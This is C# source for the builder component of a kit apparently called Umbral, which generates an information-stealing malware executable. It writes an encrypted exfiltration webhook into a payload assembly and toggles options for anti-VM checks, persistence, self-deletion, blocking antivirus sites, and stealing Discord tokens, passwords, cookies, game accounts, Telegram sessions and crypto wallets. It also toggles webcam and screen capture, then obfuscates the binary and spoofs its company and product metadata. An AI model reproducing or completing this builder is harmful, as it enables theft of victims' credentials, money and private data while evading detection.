using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Jose;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Cecil.Rocks;
using Umbral.builder.Components.Utilities;
using Vestris.ResourceLib;

namespace Umbral.builder.Components.Build
{
    internal class Builder
    {
        private const string _payloadFile = "Umbral.payload";

        public void Build(string outputFilePath)
        {
            if (!File.Exists(_payloadFile))
            {
                MessageBox.Show(_payloadFile + " Not found in the current directory.", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            else
            {
                var iv = Encoding.UTF8.GetBytes(Common.GenerateRandomString(12));
                var key = Encoding.UTF8.GetBytes(Common.GenerateRandomString(32));

                try
                {
                    var tempFile = Common.GenerateRandomString(10) + ".tmp";

                    var assembly = AssemblyDefinition.ReadAssembly(_payloadFile);
                    var settings = assembly.MainModule.Types.Single(x => x.FullName == "Umbral.payload.Settings");
                    var cctor = settings.GetStaticConstructor();

                    var strings = 0;
                    var bools = 0;

                    foreach (var instruction in cctor.Body.Instructions)
                    {
                        if (instruction.OpCode == OpCodes.Ldstr) // String
                        {
                            switch (++strings)
                            {
                                case 1: // key
                                    instruction.Operand = Convert.ToBase64String(key);
                                    break;

                                case 2: // iv
                                    instruction.Operand = Convert.ToBase64String(iv);
                                    break;

                                case 3: // encryptedWebhook
                                    instruction.Operand = Encrypt(Settings.Webhook, key, iv);
                                    break;

                                case 4: // encryptedVersion
                                    instruction.Operand = Encrypt(Settings.Version, key, iv);
                                    break;

                                case 5: // encryptedMutex;
                                    instruction.Operand = Encrypt(Settings.Mutex, key, iv);
                                    break;
                            }
                        }
                        else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1) // Boolean
                        {
                            switch (++bools)
                            {
                                case 1: // ping 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.Ping ? 1 : 0;
                                    break;

                                case 2: // startup 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.Startup ? 1 : 0;
                                    break;

                                case 3: // antiVm  
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.AntiVm ? 1 : 0;
                                    break;

                                case 4: // melt 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.Melt ? 1 : 0;
                                    break;

                                case 5: // blockAvSites 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.BlockAvSites ? 1 : 0;
                                    break;

                                case 6: // stealDiscordToken 
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealDiscordTokens ? 1 : 0;
                                    break;

                                case 7: // stealPasswords  
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealPasswords ? 1 : 0;
                                    break;

                                case 8: // stealCookies  
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealCookies ? 1 : 0;
                                    break;

                                case 9: // stealGames  
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealGames ? 1 : 0;
                                    break;

                                case 10: // stealTelegramSessions
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealTelegramSessions ? 1 : 0;
                                    break;

                                case 11: // stealSystemInfo
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealSystemInfo ? 1 : 0;
                                    break;

                                case 12: // stealWallets
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.StealWallets ? 1 : 0;
                                    break;

                                case 13: // takeWebcamSnapshot
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.TakeWebcamSnapshot ? 1 : 0;
                                    break;

                                case 14: // takeScreenshot
                                    instruction.OpCode = OpCodes.Ldc_I4;
                                    instruction.Operand = Settings.TakeScreenshot ? 1 : 0;
                                    break;
                            }
                        }
                    }
                    var renamer = new Renamer(assembly);

                    renamer.Perform();

                    assembly.Write(tempFile);

                    var resource = new VersionResource();
                    resource.LoadFrom(tempFile);
                    resource.Language = 0;

                    var stringFileInfo = (StringFileInfo)resource["StringFileInfo"];
                    stringFileInfo["CompanyName"] = Settings.CompanyName;
                    stringFileInfo["FileDescription"] = Settings.FileDescription;
                    stringFileInfo["ProductName"] = Settings.ProductName;
                    stringFileInfo["LegalCopyright"] = Settings.LegalCopyright;
                    stringFileInfo["LegalTrademarks"] = Settings.LegalTrademarks;
                    stringFileInfo["InternalName"] = Settings.InternalName;
                    stringFileInfo["OriginalFilename"] = Settings.OriginalFilename;

                    StringTableEntry.ConsiderPaddingForLength = true;
                    resource.SaveTo(tempFile);
                    
                    if (File.Exists(Settings.IconPath) && Settings.IconPath.ToLower().EndsWith(".ico") && File.Exists(tempFile))
                    {
                        try
                        {
                            var iconFile = new IconFile(Settings.IconPath);
                            var iconDirectoryResource = new IconDirectoryResource(iconFile);
                            iconDirectoryResource.SaveTo(tempFile);
                        }
                        catch { }
                    }
                    if (File.Exists(outputFilePath))
                    {
                        File.Delete(outputFilePath);
                    }

                    File.Move(tempFile, outputFilePath);

                    if (File.Exists(tempFile))
                    {
                        File.Delete(tempFile);
                    }
                    MessageBox.Show($"Successfully saved file as \"{outputFilePath}\".", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                } 
                catch (Exception ex)
                { 
                    MessageBox.Show($"Build Error: {ex.Message}", "Build Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        static private string Encrypt(string value, byte[] key, byte[] iv)
        {
            byte[][] structure = AesGcm.Encrypt(key, iv, null, Encoding.UTF8.GetBytes(value));

            return Convert.ToBase64String(structure[0].Concat(structure[1]).ToArray());
        }
    }
}
